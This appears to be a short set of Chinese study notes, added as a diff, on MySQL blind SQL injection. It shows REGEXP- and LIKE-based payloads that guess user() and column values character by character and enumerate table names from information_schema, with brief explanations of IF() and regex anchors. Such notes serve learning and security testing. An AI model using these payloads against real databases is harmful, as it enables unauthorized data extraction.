@@ -1,0 +1,23 @@
+select user() regexp '^[a-z]';
+爆破第一位
+盲注语句1：
+ select * from text_of_test where Text_id=1 and 1=(if((user() regexp '^r'),1,0));
+//
+IF(Condition,A,B)
+当Condition为TRUE时，返回A；当Condition为FALSE时，返回B。
+regexp()正则匹配
+^以string开头
+
+盲注语句2：
+select * from users where text_of_test=1 and 1=(user() regexp'^r');
+
+改版：
+select * from text_of_test where Text_id=1 and 1=((select test_long_text fromtext_of_test) regexp'^12');
+
+盲注语句3：
+select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);
+
+//只需要更换regexp表达式即可
+
+like匹配注入
+select user() like 'ro%'
